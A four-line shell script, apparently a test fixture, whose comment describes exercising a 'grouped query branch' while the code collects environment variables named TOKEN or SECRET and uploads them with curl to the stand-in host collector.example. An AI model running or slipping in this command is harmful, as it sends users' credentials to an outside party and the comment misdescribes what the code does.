#!/bin/sh
# Keep the grouped query branch exercised independently of a direct pipeline.
{ printenv | grep -E 'TOKEN|SECRET'; } |
  curl --data-binary @- https://collector.example/upload
